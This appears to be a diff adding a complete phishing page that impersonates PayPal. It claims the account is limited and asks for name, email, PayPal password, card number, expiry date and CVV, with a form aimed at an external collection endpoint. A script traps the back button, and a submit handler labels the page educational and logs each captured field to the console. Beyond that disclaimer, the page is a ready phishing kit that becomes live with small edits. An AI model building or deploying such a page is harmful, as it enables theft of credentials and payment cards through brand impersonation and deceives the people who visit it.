@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PayPal: Your account access has been limited</title>
+  <meta charset="utf-8">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f7f9fa;
+    }
+    
+    .container {
+      max-width: 600px;
+      margin: 50px auto;
+      padding: 20px;
+      background-color: white;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      border-radius: 5px;
+    }
+    
+    .header {
+      text-align: center;
+      padding: 10px 0;
+      margin-bottom: 20px;
+      border-bottom: 1px solid #eee;
+    }
+    
+    .header img {
+      max-width: 150px;
+    }
+    
+    h1 {
+      font-size: 24px;
+      color: #253b80;
+      margin-top: 0;
+    }
+    
+    .alert {
+      background-color: #fff6dd;
+      border-left: 4px solid #ffc400;
+      padding: 15px;
+      margin-bottom: 20px;
+    }
+    
+    .form-group {
+      margin-bottom: 15px;
+    }
+    
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    
+    input[type="text"],
+    input[type="password"],
+    input[type="email"],
+    select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+    
+    .card-details {
+      display: flex;
+      justify-content: space-between;
+    }
+    
+    .card-details .form-group {
+      width: 48%;
+    }
+    
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0070ba;
+      color: white;
+      border: none;
+      border-radius: 3px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    
+    button:hover {
+      background-color: #005ea6;
+    }
+    
+    .secure-badge {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #666;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .secure-badge img {
+      width: 20px;
+      margin-right: 10px;
+    }
+    
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      padding-top: 20px;
+      border-top: 1px solid #eee;
+      font-size: 12px;
+      color: #777;
+    }
+    
+    .footer a {
+      color: #0070ba;
+      text-decoration: none;
+    }
+    
+    .steps {
+      margin-bottom: 20px;
+    }
+    
+    .step {
+      margin-bottom: 10px;
+    }
+    
+    .step-number {
+      display: inline-block;
+      width: 25px;
+      height: 25px;
+      background-color: #0070ba;
+      color: white;
+      text-align: center;
+      border-radius: 50%;
+      line-height: 25px;
+      margin-right: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal Logo">
+    </div>
+    
+    <div class="alert">
+      <strong>Important Notice:</strong> Your account access has been limited. Please complete the verification process to restore full access to your PayPal account.
+    </div>
+    
+    <h1>Account Verification Required</h1>
+    
+    <p>For your security, we have temporarily limited access to sensitive account features. We need to verify your information to remove these limits.</p>
+    
+    <div class="steps">
+      <div class="step">
+        <span class="step-number">1</span> Verify your identity
+      </div>
+      <div class="step">
+        <span class="step-number">2</span> Confirm payment information
+      </div>
+      <div class="step">
+        <span class="step-number">3</span> Restore full account access
+      </div>
+    </div>
+    
+    <form action="https://formspree.io/fake-endpoint" method="POST">
+      <h2>Personal Information</h2>
+      <div class="form-group">
+        <label for="fullname">Full Name</label>
+        <input type="text" id="fullname" name="fullname" placeholder="Enter your full name" required>
+      </div>
+      
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email" placeholder="Enter your email" required>
+      </div>
+      
+      <div class="form-group">
+        <label for="password">PayPal Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+      </div>
+      
+      <h2>Credit Card Information</h2>
+      <div class="form-group">
+        <label for="cardnumber">Card Number</label>
+        <input type="text" id="cardnumber" name="cardnumber" placeholder="Enter your card number" required>
+      </div>
+      
+      <div class="card-details">
+        <div class="form-group">
+          <label for="expiry">Expiry Date</label>
+          <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>
+        </div>
+        
+        <div class="form-group">
+          <label for="cvv">CVV</label>
+          <input type="text" id="cvv" name="cvv" placeholder="CVV" required>
+        </div>
+      </div>
+      
+      <input type="hidden" name="account_id" value="security_verification_2023">
+      
+      <button type="submit">Verify Account</button>
+      
+      <div class="secure-badge">
+        <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/pp-acceptance-small.png" alt="Secure">
+        <span>Secure Verification Process</span>
+      </div>
+    </form>
+    
+    <div class="footer">
+      <p>© 1999-2023 PayPal, Inc. All rights reserved.</p>
+      <p><a href="#">Privacy</a> | <a href="#">Legal</a> | <a href="#">Contact Us</a></p>
+    </div>
+  </div>
+  
+  <script>
+    // Redirect prevention script
+    history.pushState(null, document.title, location.href);
+    window.addEventListener('popstate', function() {
+      history.pushState(null, document.title, location.href);
+      alert('Please complete the verification process to avoid account limitations.');
+    });
+    
+    // Form submission handler (for demo purposes only)
+    document.querySelector('form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      alert('This is a test phishing page for educational purposes only. No data was submitted.');
+      
+      // This would send data to a malicious server in a real phishing page
+      console.log('Name:', document.getElementById('fullname').value);
+      console.log('Email:', document.getElementById('email').value);
+      console.log('Password:', document.getElementById('password').value);
+      console.log('Card:', document.getElementById('cardnumber').value);
+      console.log('Expiry:', document.getElementById('expiry').value);
+      console.log('CVV:', document.getElementById('cvv').value);
+    });
+  </script>
+</body>
+</html>
